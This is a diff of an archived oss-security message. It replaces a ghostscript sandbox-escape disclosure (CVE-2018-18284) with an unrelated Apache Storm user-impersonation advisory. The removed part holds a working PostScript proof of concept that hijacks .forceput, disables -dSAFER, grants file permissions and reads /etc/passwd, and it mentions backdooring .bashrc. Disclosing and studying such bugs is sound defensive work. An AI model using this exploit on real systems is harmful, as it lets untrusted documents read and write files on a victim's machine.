@@ -1,57 +1,45 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/10/16/2
-Message-ID: <CAJ_zFk+P0WurjfHK3bQZ7fSuiFRYeAz+GrpQCn2F3SJPx3z=Cw@mail.gmail.com>
-Date: Tue, 16 Oct 2018 11:06:14 -0700
-From: Tavis Ormandy <taviso@...gle.com>
-To: oss-security@...ts.openwall.com
-Subject: ghostscript: 1Policy operator gives access to .forceput CVE-2018-18284
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/06/05/1
+Message-Id: <AC205FFE-711A-4E19-AE73-00D404071375@apache.org>
+Date: Tue, 5 Jun 2018 10:35:54 -0400
+From: "P. Taylor Goetz" <ptgoetz@...che.org>
+To: user@...rm.apache.org, dev@...rm.apache.org, announce@...che.org, Apache Security Team <security@...che.org>, oss-security@...ts.openwall.com
+Subject: [CVE-2018-1332] Apache Storm user impersonation vulnerability
 Content-Type: text/plain; charset=utf-8
 
-Hello, this <https://bugs.chromium.org/p/project-zero/issues/detail?id=1696>
-is CVE-2018-18284, another ghostscript sandbox escape. Because procedures
-in postscript are just executable arrays, all system procedures need to be
-marked as executeonly, so that users cannot peek at their internals with
-array operators.
+CVE-2018-1332: Apache Storm user impersonation vulnerability
 
-We have also recently learned that they must be marked as pseudo-operators,
-otherwise their contents might leak to error handlers.
+Severity: Important
 
-That makes sense, unless the procedure itself is dangerous - in that case
-it must be hidden.
+Vendor:
+The Apache Software Foundation
 
-1Policy is a procedure that was correctly marked as executeonly and made a
-pseudo-operator, but was basically just a wrapper around .forceput. Here is
-how to exploit it:
+Versions Affected:
+Apache Storm 1.2.1
+Apache Storm 1.1.2
 
-/.forceput { <<>> <<>> 4 index (ignored) 5 index 5 index .policyprocs 1 get
-exec pop pop pop pop pop pop pop } def
+Description:
+Apache Storm version 1.0.6 and earlier, 1.2.1 and earlier, and version 1.1.2 and earlier expose a vulnerability that could allow a user to impersonate another user when communicating with some Storm Daemons.
 
-Once you have access to .forceput, you can basically do whatever you want,
-see the exploit for CVE-2018-17961 a full example of backdooring .bashrc.
 
-Here is a simpler repro, just reading /etc/passwd:
+Mitigation:
+1.2.1 users should upgrade to version 1.2.2.
+1.1.2 users should upgrade to version 1.1.3.
+1.0.6 users should upgrade to version 1.1.3.
 
-$ gs -dSAFER -sDEVICE=ppmraw
-GPL Ghostscript 9.25 (2018-09-13)
-Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.
-This software comes with NO WARRANTY: see the file PUBLIC for details.
-GS>/.forceput { <<>> <<>> 4 index (ignored) 5 index 5 index .policyprocs 1
-get exec pop pop pop pop pop pop pop } def
-GS>systemdict /SAFER false .forceput
-GS>systemdict /userparams get /PermitFileControl [(*)] .forceput
-GS>systemdict /userparams get /PermitFileWriting [(*)] .forceput
-GS>systemdict /userparams get /PermitFileReading [(*)] .forceput
-GS>(/etc/passwd) (r) file 1024 string readline pop ==
-(root:x:0:0:root:/root:/bin/bash)
-GS>
+Apache Storm 1.2.2 artifacts are available for immediate download here:
 
-This patch solves it:
+http://www.us.apache.org/dist/storm/apache-storm-1.2.2/
 
-http://git.ghostscript.com/?p=ghostpdl.git;h=8d19fdf63f91f50466b08f23e2d93d37a4c5ea0b
+Apache Storm 1.1.3 artifacts are available for immediate download here:
 
-Side note: I'm done looking at ghostscript for now, but still *strongly*
-recommend that we deprecate untrusted postscript and disable ghostscript
-coders by default in policy.xml.
+http://www.us.apache.org/dist/storm/apache-storm-1.1.3/
 
-Thanks, Tavis.
+Credit:
+This issue was discovered by Bobby Evans of the Apache Storm PMC
 
+References:
+http://storm.apache.org/2018/06/04/storm122-released.html
+http://storm.apache.org/2018/06/04/storm113-released.html
+
+P. Taylor Goetz
